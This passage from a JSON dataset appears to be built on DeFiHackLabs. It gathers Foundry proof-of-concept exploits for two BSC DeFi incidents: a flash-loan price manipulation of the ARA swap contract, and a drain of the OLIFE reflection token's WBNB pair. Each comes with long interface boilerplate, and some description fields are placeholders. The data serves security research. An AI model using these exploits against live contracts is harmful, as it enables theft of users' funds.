        "github_path": "https://github.com/SunWeb3Sec/DeFiHackLabs/",
        "reference_links": [
            {
                "link": "https://twitter.com/BeosinAlert/status/1670638160550965248",
                "content": "content of the link"
            }
        ],
        "data": [
            {
                "contract_path": "src/test/ARA_exp.sol",
                "testcase": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n// @KeyInfo - Total Lost : ~125K USD$\n// Attacker : https://bscscan.com/address/0xf84efa8a9f7e68855cf17eaac9c2f97a9d131366\n// Attack Contract : https://bscscan.com/address/0x98e241bd3be918e0d927af81b430be00d86b04f9\n// Vulnerable Contract : https://bscscan.com/address/0x7ba5dd9bb357afa2231446198c75bac17cefcda9\n// @Analysis\n// https://twitter.com/BeosinAlert/status/1670638160550965248\ninterface IPancakeRouterV3 {\n    struct ExactInputSingleParams {\n        address tokenIn;\n        address tokenOut;\n        uint24 fee;\n        address recipient;\n        uint256 amountIn;\n        uint256 amountOutMinimum;\n        uint160 sqrtPriceLimitX96;\n    }\n    function exactInputSingle(ExactInputSingleParams memory params) external payable returns (uint256 amountOut);\n}\ncontract ARATest is Test {\n    IERC20 BUSDT = IERC20(0x55d398326f99059fF775485246999027B3197955);\n    IERC20 ARA = IERC20(0x5542958FA9bD89C96cB86D1A6Cb7a3e644a3d46e);\n    IPancakeRouterV3 Router =\n        IPancakeRouterV3(0x13f4EA83D0bd40E75C8222255bc855a974568Dd4);\n    IDPPOracle DPPOracle =\n        IDPPOracle(0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A);\n    address public constant exploitableSwapContract =\n        0x7BA5dd9Bb357aFa2231446198c75baC17CEfCda9;\n    // Address param required for calling the exploitable contract\n    address public constant approvedAddress =\n        0xB817Ef68d764F150b8d73A2ad7ce9269674538E0;\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    function setUp() public {\n        cheats.createSelectFork(\"bsc\", 29214010);\n        cheats.label(address(BUSDT), \"BUSDT\");\n        cheats.label(address(ARA), \"ARA\");\n        cheats.label(address(Router), \"Router\");\n        cheats.label(address(DPPOracle), \"DPPOracle\");\n        cheats.label(exploitableSwapContract, \"Exploitable Contract\");\n        cheats.label(approvedAddress, \"Approved Address\");\n    }\n    function testExploit() public {\n        deal(address(BUSDT), address(this), 0);\n        BUSDT.approve(address(Router), type(uint256).max);\n        ARA.approve(address(Router), type(uint256).max);\n        emit log_named_decimal_uint(\"Attacker BUSDT balance before hack\",\n            BUSDT.balanceOf(address(this)),\n            BUSDT.decimals());\n        // Step 1. Flashloan 1,202,701 USDT\n        DPPOracle.flashLoan(0, 1_202_701 * 1e18, address(this), new bytes(1));\n        emit log_named_decimal_uint(\"Attacker BUSDT balance after hack\",\n            BUSDT.balanceOf(address(this)),\n            BUSDT.decimals());\n    }\n    function DPPFlashLoanCall(address sender,\n        uint256 baseAmount,\n        uint256 quoteAmount,\n        bytes calldata data) external {\n        // Step 2. Call the exploitable swap contract to swap 163,497 ARA -> 123,246 USDT\n        callSwapContract(163_497 * 1e18, ARA);\n        // Step 3. Use flashloaned 1,202,701 USDT -> 504,469 ARA to pull up the $ARA price.\n        routerV3Swap(BUSDT, ARA, 1_202_701 * 1e18);\n        emit log_named_decimal_uint(\"Step 3. ARA amount out after first V3 swap\",\n            ARA.balanceOf(address(this)),\n            ARA.decimals());\n        callSwapContract(132_123 * 1e18, BUSDT);\n        // Step 5. Swap 504,469 ARA -> 1,327,617 USDT\n        routerV3Swap(ARA, BUSDT, ARA.balanceOf(address(this)));\n        emit log_named_decimal_uint(\"Step 5. BUSDT amount out after second V3 swap\",\n            BUSDT.balanceOf(address(this)),\n            BUSDT.decimals());\n        BUSDT.transfer(address(DPPOracle), quoteAmount);\n    }\n    function callSwapContract(uint256 amount, IERC20 token) internal {\n        (bool success, bytes memory retData) = exploitableSwapContract.call(abi.encodeWithSelector(bytes4(0x135b43e9),\n                amount,\n                0,\n                address(token),\n                approvedAddress));\n        require(success, \"Swap not successful\");\n    }\n    function routerV3Swap(IERC20 token1,\n        IERC20 token2,\n        uint256 amount) internal {\n        IPancakeRouterV3.ExactInputSingleParams memory params = IPancakeRouterV3\n            .ExactInputSingleParams({\n                tokenIn: address(token1),\n                tokenOut: address(token2),\n                fee: 100,\n                recipient: address(this),\n                amountIn: amount,\n                amountOutMinimum: 0,\n                sqrtPriceLimitX96: 0\n            });\n        Router.exactInputSingle(params);\n    }\n}",
                "token_count": 1280,
                "interfaces": [
                    {
                        "name": "IPancakeRouterV3",
                        "content": "interface IPancakeRouterV3 {\n    struct ExactInputSingleParams {\n        address tokenIn;\n        address tokenOut;\n        uint24 fee;\n        address recipient;\n        uint256 amountIn;\n        uint256 amountOutMinimum;\n        uint160 sqrtPriceLimitX96;\n    }\n\n    function exactInputSingle(\n        ExactInputSingleParams memory params\n    ) external payable returns (uint256 amountOut);\n}\n",
                        "token_count": 84,
                        "imported": false
                    },
                    {
                        "name": "CheatCodes",
                        "content": "interface CheatCodes {\n  // This allows us to getRecordedLogs()\n  struct Log {bytes32[] topics; bytes data;}\n  // Set block.timestamp (newTimestamp)\n  function warp(uint256) external;\n  // Set block.height (newHeight)\n  function roll(uint256) external;\n  // Set block.basefee (newBasefee)\n  function fee(uint256) external;\n  // Set block.coinbase (who)\n  function coinbase(address) external;\n  // Loads a storage slot from an address (who, slot)\n  function load(address,bytes32) external returns (bytes32);\n  // Stores a value to an address' storage slot, (who, slot, value)\n  function store(address,bytes32,bytes32) external;\n  // Signs data, (privateKey, digest) => (v, r, s)\n  function sign(uint256,bytes32) external returns (uint8,bytes32,bytes32);\n  // Gets address for a given private key, (privateKey) => (address)\n  function addr(uint256) external returns (address);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}\n  function deriveKey(string calldata, uint32) external returns (uint256);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}\n  function deriveKey(string calldata, string calldata, uint32) external returns (uint256);\n  // Performs a foreign function call via terminal, (stringInputs) => (result)\n  function ffi(string[] calldata) external returns (bytes memory);\n  // Set environment variables, (name, value)\n  function setEnv(string calldata, string calldata) external;\n  // Read environment variables, (name) => (value)\n  function envBool(string calldata) external returns (bool);\n  function envUint(string calldata) external returns (uint256);\n  function envInt(string calldata) external returns (int256);\n  function envAddress(string calldata) external returns (address);\n  function envBytes32(string calldata) external returns (bytes32);\n  function envString(string calldata) external returns (string memory);\n  function envBytes(string calldata) external returns (bytes memory);\n  // Read environment variables as arrays, (name, delim) => (value[])\n  function envBool(string calldata, string calldata) external returns (bool[] memory);\n  function envUint(string calldata, string calldata) external returns (uint256[] memory);\n  function envInt(string calldata, string calldata) external returns (int256[] memory);\n  function envAddress(string calldata, string calldata) external returns (address[] memory);\n  function envBytes32(string calldata, string calldata) external returns (bytes32[] memory);\n  function envString(string calldata, string calldata) external returns (string[] memory);\n  function envBytes(string calldata, string calldata) external returns (bytes[] memory);\n  // Sets the *next* call's msg.sender to be the input address\n  function prank(address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called\n  function startPrank(address) external;\n  // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input\n  function prank(address,address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input\n  function startPrank(address,address) external;\n  // Resets subsequent calls' msg.sender to be `address(this)`\n  function stopPrank() external;\n  // Sets an address' balance, (who, newBalance)\n  function deal(address, uint256) external;\n  // Sets an address' code, (who, newCode)\n  function etch(address, bytes calldata) external;\n  // Expects an error on next call\n  function expectRevert() external;\n  function expectRevert(bytes calldata) external;\n  function expectRevert(bytes4) external;\n  // Record all storage reads and writes\n  function record() external;\n  // Gets all accessed reads and write slot from a recording session, for a given address\n  function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);\n  // Record all the transaction logs\n  function recordLogs() external;\n  // Gets all the recorded logs\n  function getRecordedLogs() external returns (Log[] memory);\n  // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).\n  // Call this function, then emit an event, then call a function. Internally after the call, we check if\n  // logs were emitted in the expected order with the expected topics and data (as specified by the booleans).\n  // Second form also checks supplied address against emitting contract.\n  function expectEmit(bool,bool,bool,bool) external;\n  function expectEmit(bool,bool,bool,bool,address) external;\n  // Mocks a call to an address, returning specified data.\n  // Calldata can either be strict or a partial match, e.g. if you only\n  // pass a Solidity selector to the expected calldata, then the entire Solidity\n  // function will be mocked.\n  function mockCall(address,bytes calldata,bytes calldata) external;\n  // Mocks a call to an address with a specific msg.value, returning specified data.\n  // Calldata match takes precedence over msg.value in case of ambiguity.\n  function mockCall(address,uint256,bytes calldata,bytes calldata) external;\n  // Clears all mocked calls\n  function clearMockedCalls() external;\n  // Expect a call to an address with the specified calldata.\n  // Calldata can either be strict or a partial match\n  function expectCall(address,bytes calldata) external;\n  // Expect a call to an address with the specified msg.value and calldata\n  function expectCall(address,uint256,bytes calldata) external;\n  // Gets the code from an artifact file. Takes in the relative path to the json file\n  function getCode(string calldata) external returns (bytes memory);\n  // Labels an address in call traces\n  function label(address, string calldata) external;\n  // If the condition is false, discard this run's fuzz inputs and generate new ones\n  function assume(bool) external;\n  // Set nonce for an account\n  function setNonce(address,uint64) external;\n  // Get nonce for an account\n  function getNonce(address) external returns(uint64);\n  // Set block.chainid (newChainId)\n  function chainId(uint256) external;\n  // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain\n  function broadcast() external;\n  // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain\n  function broadcast(address) external;\n  // Using the address that calls the test contract, has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast() external;\n  // Has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast(address) external;\n  // Stops collecting onchain transactions\n  function stopBroadcast() external;\n  // Reads the entire content of file to string. Path is relative to the project root. (path) => (data)\n  function readFile(string calldata) external returns (string memory);\n  // Reads next line of file to string, (path) => (line)\n  function readLine(string calldata) external returns (string memory);\n  // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.\n  // Path is relative to the project root. (path, data) => ()\n  function writeFile(string calldata, string calldata) external;\n  // Writes line to file, creating a file if it does not exist.\n  // Path is relative to the project root. (path, data) => ()\n  function writeLine(string calldata, string calldata) external;\n  // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.\n  // Path is relative to the project root. (path) => ()\n  function closeFile(string calldata) external;\n  // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:\n  // - Path points to a directory.\n  // - The file doesn't exist.\n  // - The user lacks permissions to remove the file.\n  // Path is relative to the project root. (path) => ()\n  function removeFile(string calldata) external;\n\n  function toString(address)        external returns(string memory);\n  function toString(bytes calldata) external returns(string memory);\n  function toString(bytes32)        external returns(string memory);\n  function toString(bool)           external returns(string memory);\n  function toString(uint256)        external returns(string memory);\n  function toString(int256)         external returns(string memory);\n  // Snapshot the current state of the evm.\n  // Returns the id of the snapshot that was created.\n  // To revert a snapshot use `revertTo`\n  function snapshot() external returns(uint256);\n  // Revert the state of the evm to a previous snapshot\n  // Takes the snapshot id to revert to.\n  // This deletes the snapshot and all snapshots taken after the given snapshot id.\n  function revertTo(uint256) external returns(bool);\n  // Creates a new fork with the given endpoint and block and returns the identifier of the fork\n  function createFork(string calldata,uint256) external returns(uint256);\n  // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork\n  function createFork(string calldata) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork\n  function createSelectFork(string calldata,uint256) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork\n  function createSelectFork(string calldata) external returns(uint256);\n  // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.\n  function selectFork(uint256) external;\n  /// Returns the currently active fork\n  /// Reverts if no fork is currently active\n  function activeFork() external returns(uint256);\n  // Updates the currently active fork to given block number\n  // This is similar to `roll` but for the currently active fork\n  function rollFork(uint256) external;\n  // Updates the given fork to given block number\n  function rollFork(uint256 forkId, uint256 blockNumber) external;\n  /// Returns the RPC url for the given alias\n  function rpcUrl(string calldata) external returns(string memory);\n  /// Returns all rpc urls and their aliases `[alias, url][]`\n  function rpcUrls() external returns(string[2][] memory);\n  function makePersistent(address account) external;\n}\n",
                        "token_count": 2438,
                        "imported": true
                    },
                    {
                        "name": "IERC20",
                        "content": "interface IERC20 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function name() external view returns (string memory);\n\n  function symbol() external view returns (string memory);\n\n  function decimals() external view returns (uint8);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n  function withdraw(uint256 wad) external;\n  function deposit(uint256 wad) external returns (bool);\n  function owner() external view virtual returns (address);\n}\n",
                        "token_count": 205,
                        "imported": true
                    },
                    {
                        "name": "IDPPOracle",
                        "content": "interface IDPPOracle {\n    function flashLoan(\n        uint256 baseAmount,\n        uint256 quoteAmount,\n        address _assetTo,\n        bytes calldata data\n    ) external;\n}\n",
                        "token_count": 41,
                        "imported": true
                    }
                ]
            }
        ]
    },
    {
        "id": "7d37f391f5",
        "is_ready": false,
        "content": "### 20230419 OLIFE - Reflection token\n### Lost: ~32 WBNB\n#### Contract\n[OLIFE_exp.sol](src/test/OLIFE_exp.sol)\n#### Link Reference\nhttps://twitter.com/BeosinAlert/status/1648520494516420608",
        "date": "20230419",
        "target": "OLIFE",
        "attack_title": "Reflection token",
        "vuln_desc": "A description of the exposed vulnerability.",
        "poc_explain": "An explaination of how the poc exposes the vulnerability.",
        "lost_value": null,
        "github_path": "https://github.com/SunWeb3Sec/DeFiHackLabs/",
        "reference_links": [
            {
                "link": "https://twitter.com/BeosinAlert/status/1648520494516420608",
                "content": "content of the link"
            }
        ],
        "data": [
            {
                "contract_path": "src/test/OLIFE_exp.sol",
                "testcase": "// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.10;\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n// @Analysis\n// https://twitter.com/BeosinAlert/status/1648520494516420608\n// @TX\n// https://bscscan.com/tx/0xa21692ffb561767a74a4cbd1b78ad48151d710efab723b1efa5f1e0147caab0a\n// @Summary\n// The value of rate is thus calculated less, increasing the number of reflected tokens in the pair, \n// Finally directly call swap to withdraw $WBNB from the pair.\ninterface IOceanLife {\n    function approve(address spender, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function deliver(uint256 tAmount) external;\n    function transfer(address recipient, uint256 amount) external returns (bool);\n}\ncontract ContractTest is Test {\n    uint256 constant internal FLASHLOAN_WBNB_AMOUNT = 969 * 1e18;\n    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);\n    IOceanLife constant OLIFE = IOceanLife(0xb5a0Ce3Acd6eC557d39aFDcbC93B07a1e1a9e3fa);\n    IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));\n    IPancakePair constant OLIFE_WBNB_LPPool = IPancakePair(0x915C2DFc34e773DC3415Fe7045bB1540F8BDAE84);\n    address constant dodo = 0xFeAFe253802b77456B4627F8c2306a9CeBb5d681;\n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    function setUp() external {\n        cheats.createSelectFork(\"bsc\", 27470678);\n    }\n    function testExploit() external {\n        DVM(dodo).flashLoan(FLASHLOAN_WBNB_AMOUNT, 0, address(this), new bytes(1));\n        emit log_named_decimal_uint(\"[End] Attacker WBNB balance after exploit\", WBNB.balanceOf(address(this)), 18);\n    }\n    function loopTransfer(uint256 num) internal {\n        uint i;\n        while(i < num) {\n            uint256 amount = OLIFE.balanceOf(address(this));\n            OLIFE.transfer(address(this), amount);\n            i++;\n        }\n    }\n    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {\n        WBNB.approve(address(pancakeRouter), type(uint256).max);\n        address[] memory swapPath = new address[](2);\n        swapPath[0] = address(WBNB);\n        swapPath[1] = address(OLIFE);\n        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(FLASHLOAN_WBNB_AMOUNT,\n            0,\n            swapPath,\n            address(this),\n            block.timestamp);\n        emit log_named_decimal_uint(\"[INFO] OLIFE amount in pair before the currentRate reduction\", OLIFE.balanceOf(address(OLIFE_WBNB_LPPool)), 9);\n        loopTransfer(19);\n        OLIFE.deliver(66859267695870000);\n        emit log_named_decimal_uint(\"[INFO] OLIFE amount in pair after the currentRate reduction\", OLIFE.balanceOf(address(OLIFE_WBNB_LPPool)), 9);\n        (uint256 oldOlifeReserve, uint256 bnbReserve,) = OLIFE_WBNB_LPPool.getReserves();\n        uint256 newolifeReserve = OLIFE.balanceOf(address(OLIFE_WBNB_LPPool));\n        uint256 amountin = newolifeReserve - oldOlifeReserve;\n        uint256 swapAmount = amountin * 9975 * bnbReserve / (oldOlifeReserve * 10000 + amountin * 9975);\n        //swap OLIFE to WBNB\n        OLIFE_WBNB_LPPool.swap(0, swapAmount, address(this), \"\");\n        // repay\n        WBNB.transfer(address(dodo), FLASHLOAN_WBNB_AMOUNT);\n    }\n}",
                "token_count": 994,
                "interfaces": [
                    {
                        "name": "IOceanLife",
                        "content": "interface IOceanLife {\n    function approve(address spender, uint256 amount) external returns (bool);\n    function balanceOf(address account) external view returns (uint256);\n    function deliver(uint256 tAmount) external;\n    function transfer(address recipient, uint256 amount) external returns (bool);\n}\n",
                        "token_count": 60,
                        "imported": false
                    },
                    {
                        "name": "CheatCodes",
                        "content": "interface CheatCodes {\n  // This allows us to getRecordedLogs()\n  struct Log {bytes32[] topics; bytes data;}\n  // Set block.timestamp (newTimestamp)\n  function warp(uint256) external;\n  // Set block.height (newHeight)\n  function roll(uint256) external;\n  // Set block.basefee (newBasefee)\n  function fee(uint256) external;\n  // Set block.coinbase (who)\n  function coinbase(address) external;\n  // Loads a storage slot from an address (who, slot)\n  function load(address,bytes32) external returns (bytes32);\n  // Stores a value to an address' storage slot, (who, slot, value)\n  function store(address,bytes32,bytes32) external;\n  // Signs data, (privateKey, digest) => (v, r, s)\n  function sign(uint256,bytes32) external returns (uint8,bytes32,bytes32);\n  // Gets address for a given private key, (privateKey) => (address)\n  function addr(uint256) external returns (address);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path m/44'/60'/0'/0/{index}\n  function deriveKey(string calldata, uint32) external returns (uint256);\n  // Derive a private key from a provided mnenomic string (or mnenomic file path) at the derivation path {path}{index}\n  function deriveKey(string calldata, string calldata, uint32) external returns (uint256);\n  // Performs a foreign function call via terminal, (stringInputs) => (result)\n  function ffi(string[] calldata) external returns (bytes memory);\n  // Set environment variables, (name, value)\n  function setEnv(string calldata, string calldata) external;\n  // Read environment variables, (name) => (value)\n  function envBool(string calldata) external returns (bool);\n  function envUint(string calldata) external returns (uint256);\n  function envInt(string calldata) external returns (int256);\n  function envAddress(string calldata) external returns (address);\n  function envBytes32(string calldata) external returns (bytes32);\n  function envString(string calldata) external returns (string memory);\n  function envBytes(string calldata) external returns (bytes memory);\n  // Read environment variables as arrays, (name, delim) => (value[])\n  function envBool(string calldata, string calldata) external returns (bool[] memory);\n  function envUint(string calldata, string calldata) external returns (uint256[] memory);\n  function envInt(string calldata, string calldata) external returns (int256[] memory);\n  function envAddress(string calldata, string calldata) external returns (address[] memory);\n  function envBytes32(string calldata, string calldata) external returns (bytes32[] memory);\n  function envString(string calldata, string calldata) external returns (string[] memory);\n  function envBytes(string calldata, string calldata) external returns (bytes[] memory);\n  // Sets the *next* call's msg.sender to be the input address\n  function prank(address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called\n  function startPrank(address) external;\n  // Sets the *next* call's msg.sender to be the input address, and the tx.origin to be the second input\n  function prank(address,address) external;\n  // Sets all subsequent calls' msg.sender to be the input address until `stopPrank` is called, and the tx.origin to be the second input\n  function startPrank(address,address) external;\n  // Resets subsequent calls' msg.sender to be `address(this)`\n  function stopPrank() external;\n  // Sets an address' balance, (who, newBalance)\n  function deal(address, uint256) external;\n  // Sets an address' code, (who, newCode)\n  function etch(address, bytes calldata) external;\n  // Expects an error on next call\n  function expectRevert() external;\n  function expectRevert(bytes calldata) external;\n  function expectRevert(bytes4) external;\n  // Record all storage reads and writes\n  function record() external;\n  // Gets all accessed reads and write slot from a recording session, for a given address\n  function accesses(address) external returns (bytes32[] memory reads, bytes32[] memory writes);\n  // Record all the transaction logs\n  function recordLogs() external;\n  // Gets all the recorded logs\n  function getRecordedLogs() external returns (Log[] memory);\n  // Prepare an expected log with (bool checkTopic1, bool checkTopic2, bool checkTopic3, bool checkData).\n  // Call this function, then emit an event, then call a function. Internally after the call, we check if\n  // logs were emitted in the expected order with the expected topics and data (as specified by the booleans).\n  // Second form also checks supplied address against emitting contract.\n  function expectEmit(bool,bool,bool,bool) external;\n  function expectEmit(bool,bool,bool,bool,address) external;\n  // Mocks a call to an address, returning specified data.\n  // Calldata can either be strict or a partial match, e.g. if you only\n  // pass a Solidity selector to the expected calldata, then the entire Solidity\n  // function will be mocked.\n  function mockCall(address,bytes calldata,bytes calldata) external;\n  // Mocks a call to an address with a specific msg.value, returning specified data.\n  // Calldata match takes precedence over msg.value in case of ambiguity.\n  function mockCall(address,uint256,bytes calldata,bytes calldata) external;\n  // Clears all mocked calls\n  function clearMockedCalls() external;\n  // Expect a call to an address with the specified calldata.\n  // Calldata can either be strict or a partial match\n  function expectCall(address,bytes calldata) external;\n  // Expect a call to an address with the specified msg.value and calldata\n  function expectCall(address,uint256,bytes calldata) external;\n  // Gets the code from an artifact file. Takes in the relative path to the json file\n  function getCode(string calldata) external returns (bytes memory);\n  // Labels an address in call traces\n  function label(address, string calldata) external;\n  // If the condition is false, discard this run's fuzz inputs and generate new ones\n  function assume(bool) external;\n  // Set nonce for an account\n  function setNonce(address,uint64) external;\n  // Get nonce for an account\n  function getNonce(address) external returns(uint64);\n  // Set block.chainid (newChainId)\n  function chainId(uint256) external;\n  // Using the address that calls the test contract, has the next call (at this call depth only) create a transaction that can later be signed and sent onchain\n  function broadcast() external;\n  // Has the next call (at this call depth only) create a transaction with the address provided as the sender that can later be signed and sent onchain\n  function broadcast(address) external;\n  // Using the address that calls the test contract, has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast() external;\n  // Has the all subsequent calls (at this call depth only) create transactions that can later be signed and sent onchain\n  function startBroadcast(address) external;\n  // Stops collecting onchain transactions\n  function stopBroadcast() external;\n  // Reads the entire content of file to string. Path is relative to the project root. (path) => (data)\n  function readFile(string calldata) external returns (string memory);\n  // Reads next line of file to string, (path) => (line)\n  function readLine(string calldata) external returns (string memory);\n  // Writes data to file, creating a file if it does not exist, and entirely replacing its contents if it does.\n  // Path is relative to the project root. (path, data) => ()\n  function writeFile(string calldata, string calldata) external;\n  // Writes line to file, creating a file if it does not exist.\n  // Path is relative to the project root. (path, data) => ()\n  function writeLine(string calldata, string calldata) external;\n  // Closes file for reading, resetting the offset and allowing to read it from beginning with readLine.\n  // Path is relative to the project root. (path) => ()\n  function closeFile(string calldata) external;\n  // Removes file. This cheatcode will revert in the following situations, but is not limited to just these cases:\n  // - Path points to a directory.\n  // - The file doesn't exist.\n  // - The user lacks permissions to remove the file.\n  // Path is relative to the project root. (path) => ()\n  function removeFile(string calldata) external;\n\n  function toString(address)        external returns(string memory);\n  function toString(bytes calldata) external returns(string memory);\n  function toString(bytes32)        external returns(string memory);\n  function toString(bool)           external returns(string memory);\n  function toString(uint256)        external returns(string memory);\n  function toString(int256)         external returns(string memory);\n  // Snapshot the current state of the evm.\n  // Returns the id of the snapshot that was created.\n  // To revert a snapshot use `revertTo`\n  function snapshot() external returns(uint256);\n  // Revert the state of the evm to a previous snapshot\n  // Takes the snapshot id to revert to.\n  // This deletes the snapshot and all snapshots taken after the given snapshot id.\n  function revertTo(uint256) external returns(bool);\n  // Creates a new fork with the given endpoint and block and returns the identifier of the fork\n  function createFork(string calldata,uint256) external returns(uint256);\n  // Creates a new fork with the given endpoint and the _latest_ block and returns the identifier of the fork\n  function createFork(string calldata) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and block and returns the identifier of the fork\n  function createSelectFork(string calldata,uint256) external returns(uint256);\n  // Creates _and_ also selects a new fork with the given endpoint and the latest block and returns the identifier of the fork\n  function createSelectFork(string calldata) external returns(uint256);\n  // Takes a fork identifier created by `createFork` and sets the corresponding forked state as active.\n  function selectFork(uint256) external;\n  /// Returns the currently active fork\n  /// Reverts if no fork is currently active\n  function activeFork() external returns(uint256);\n  // Updates the currently active fork to given block number\n  // This is similar to `roll` but for the currently active fork\n  function rollFork(uint256) external;\n  // Updates the given fork to given block number\n  function rollFork(uint256 forkId, uint256 blockNumber) external;\n  /// Returns the RPC url for the given alias\n  function rpcUrl(string calldata) external returns(string memory);\n  /// Returns all rpc urls and their aliases `[alias, url][]`\n  function rpcUrls() external returns(string[2][] memory);\n  function makePersistent(address account) external;\n}\n",
                        "token_count": 2438,
                        "imported": true
                    },
                    {
                        "name": "IERC20",
                        "content": "interface IERC20 {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function name() external view returns (string memory);\n\n  function symbol() external view returns (string memory);\n\n  function decimals() external view returns (uint8);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n  function withdraw(uint256 wad) external;\n  function deposit(uint256 wad) external returns (bool);\n  function owner() external view virtual returns (address);\n}\n",
                        "token_count": 205,
                        "imported": true
                    },
                    {
                        "name": "IPancakePair",
                        "content": "interface IPancakePair {\n  event Approval(address indexed owner, address indexed spender, uint256 value);\n  event Transfer(address indexed from, address indexed to, uint256 value);\n\n  function name() external pure returns (string memory);\n\n  function symbol() external pure returns (string memory);\n\n  function decimals() external pure returns (uint8);\n\n  function totalSupply() external view returns (uint256);\n\n  function balanceOf(address owner) external view returns (uint256);\n\n  function allowance(address owner, address spender)\n  external\n  view\n  returns (uint256);\n\n  function approve(address spender, uint256 value) external returns (bool);\n\n  function transfer(address to, uint256 value) external returns (bool);\n\n  function transferFrom(\n    address from,\n    address to,\n    uint256 value\n  ) external returns (bool);\n\n  function DOMAIN_SEPARATOR() external view returns (bytes32);\n\n  function PERMIT_TYPEHASH() external pure returns (bytes32);\n\n  function nonces(address owner) external view returns (uint256);\n\n  function permit(\n    address owner,\n    address spender,\n    uint256 value,\n    uint256 deadline,\n    uint8 v,\n    bytes32 r,\n    bytes32 s\n  ) external;\n\n  event Mint(address indexed sender, uint256 amount0, uint256 amount1);\n  event Burn(\n    address indexed sender,\n    uint256 amount0,\n    uint256 amount1,\n    address indexed to\n  );\n  event Swap(\n    address indexed sender,\n    uint256 amount0In,\n    uint256 amount1In,\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address indexed to\n  );\n  event Sync(uint112 reserve0, uint112 reserve1);\n\n  function MINIMUM_LIQUIDITY() external pure returns (uint256);\n\n  function factory() external view returns (address);\n\n  function token0() external view returns (address);\n\n  function token1() external view returns (address);\n\n  function getReserves()\n  external\n  view\n  returns (\n    uint112 reserve0,\n    uint112 reserve1,\n    uint32 blockTimestampLast\n  );\n\n  function price0CumulativeLast() external view returns (uint256);\n\n  function price1CumulativeLast() external view returns (uint256);\n\n  function kLast() external view returns (uint256);\n\n  function mint(address to) external returns (uint256 liquidity);\n\n  function burn(address to) external returns (uint256 amount0, uint256 amount1);\n\n  function swap(\n    uint256 amount0Out,\n    uint256 amount1Out,\n    address to,\n    bytes calldata data\n  ) external;\n\n  function skim(address to) external;\n\n  function sync() external;\n\n  function initialize(address, address) external;\n}\n",
                        "token_count": 569,
                        "imported": true
                    },
                    {
                        "name": "IPancakeRouter",
